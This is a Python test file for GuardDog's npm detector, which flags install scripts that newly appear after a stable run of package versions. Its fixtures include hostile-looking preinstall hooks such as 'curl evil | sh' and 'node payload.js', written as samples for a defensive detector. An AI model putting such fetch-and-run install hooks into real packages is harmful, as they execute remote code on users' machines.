from guarddog.analyzer.metadata.npm.new_install_script import (
    NPMNewInstallScriptDetector,
)


def make_info(versions_scripts, times, latest, name="parent"):
    """Build a minimal npm registry metadata dict.

    `versions_scripts` maps version -> scripts dict (or None for no scripts
    field at all).
    """
    versions = {}
    for v, scripts in versions_scripts.items():
        info = {
            "dist": {"tarball": f"https://registry.npmjs.org/{name}/-/{name}-{v}.tgz"}
        }
        if scripts is not None:
            info["scripts"] = scripts
        versions[v] = info
    return {
        "name": name,
        "dist-tags": {"latest": latest},
        "versions": versions,
        "time": times,
    }


def times(*versions):
    t = {"created": "2020-01-01T00:00:00.000Z"}
    for i, v in enumerate(versions):
        t[v] = f"2020-0{i + 1}-01T00:00:00.000Z"
    t["modified"] = t[versions[-1]]
    return t


class TestNewInstallScript:
    detector = NPMNewInstallScriptDetector()

    def test_no_scripts_on_latest_not_flagged(self):
        info = make_info(
            versions_scripts={
                "1.0.0": None,
                "1.1.0": {"test": "jest"},
                "1.2.0": None,
                "1.3.0": {"build": "tsc"},
            },
            times=times("1.0.0", "1.1.0", "1.2.0", "1.3.0"),
            latest="1.3.0",
        )
        matched, message = self.detector.detect(info)
        assert matched is False
        assert message is None

    def test_first_appearance_over_established_baseline_flagged(self):
        info = make_info(
            versions_scripts={
                "1.0.0": None,
                "1.1.0": {"test": "jest"},
                "1.2.0": None,
                "1.3.0": {"preinstall": "node payload.js"},
            },
            times=times("1.0.0", "1.1.0", "1.2.0", "1.3.0"),
            latest="1.3.0",
        )
        matched, message = self.detector.detect(info)
        assert matched is True
        assert "preinstall" in message
        assert "1.3.0" in message

    def test_history_already_used_install_scripts_not_flagged(self):
        info = make_info(
            versions_scripts={
                "1.0.0": {"install": "node-gyp rebuild"},
                "1.1.0": None,
                "1.2.0": None,
                "1.3.0": {"install": "node-gyp rebuild"},
            },
            times=times("1.0.0", "1.1.0", "1.2.0", "1.3.0"),
            latest="1.3.0",
        )
        matched, message = self.detector.detect(info)
        assert matched is False
        assert message is None

    def test_short_baseline_not_flagged(self):
        info = make_info(
            versions_scripts={
                "1.0.0": None,
                "1.1.0": {"postinstall": "node setup.js"},
            },
            times=times("1.0.0", "1.1.0"),
            latest="1.1.0",
        )
        matched, message = self.detector.detect(info)
        assert matched is False
        assert message is None

    def test_new_package_with_scripts_from_birth_not_flagged(self):
        info = make_info(
            versions_scripts={"1.0.0": {"postinstall": "node setup.js"}},
            times=times("1.0.0"),
            latest="1.0.0",
        )
        matched, message = self.detector.detect(info)
        assert matched is False
        assert message is None

    def test_explicit_version_scanned_not_latest(self):
        info = make_info(
            versions_scripts={
                "1.0.0": None,
                "1.1.0": None,
                "1.2.0": None,
                "1.3.0": {"preinstall": "curl evil | sh"},
                "1.4.0": None,
            },
            times=times("1.0.0", "1.1.0", "1.2.0", "1.3.0", "1.4.0"),
            latest="1.4.0",
        )
        matched, message = self.detector.detect(info, version="1.3.0")
        assert matched is True
        assert "1.3.0" in message

    def test_later_line_scripts_do_not_taint_older_line_baseline(self):
        # An 8.0.0-alpha (published first, uses scripts) must not count as
        # "history already used scripts" for a 7.x maintenance release, nor as
        # part of its baseline.
        info = make_info(
            versions_scripts={
                "8.0.0-alpha.1": {"postinstall": "node build.js"},
                "7.1.0": None,
                "7.2.0": None,
                "7.3.0": None,
                "7.4.0": {"preinstall": "node payload.js"},
            },
            times=times("8.0.0-alpha.1", "7.1.0", "7.2.0", "7.3.0", "7.4.0"),
            latest="7.4.0",
        )
        matched, message = self.detector.detect(info)
        assert matched is True
        assert "7.4.0" in message

    def test_prerelease_introduction_counts_as_history(self):
        # A script introduced in 2.0.0-beta.1 is prior history for 2.0.0:
        # the stable release must not be reported as the first appearance.
        info = make_info(
            versions_scripts={
                "1.0.0": None,
                "1.1.0": None,
                "1.2.0": None,
                "2.0.0-beta.1": {"postinstall": "node build.js"},
                "2.0.0": {"postinstall": "node build.js"},
            },
            times=times("1.0.0", "1.1.0", "1.2.0", "2.0.0-beta.1", "2.0.0"),
            latest="2.0.0",
        )
        matched, message = self.detector.detect(info)
        assert matched is False
        assert message is None

    def test_empty_script_values_are_not_scripts(self):
        info = make_info(
            versions_scripts={
                "1.0.0": None,
                "1.1.0": None,
                "1.2.0": None,
                "1.3.0": {"preinstall": ""},
            },
            times=times("1.0.0", "1.1.0", "1.2.0", "1.3.0"),
            latest="1.3.0",
        )
        matched, message = self.detector.detect(info)
        assert matched is False
        assert message is None

    def test_unknown_version_skipped(self):
        info = make_info(
            versions_scripts={"1.0.0": None},
            times=times("1.0.0"),
            latest="1.0.0",
        )
        matched, message = self.detector.detect(info, version="9.9.9")
        assert matched is False
        assert message is None
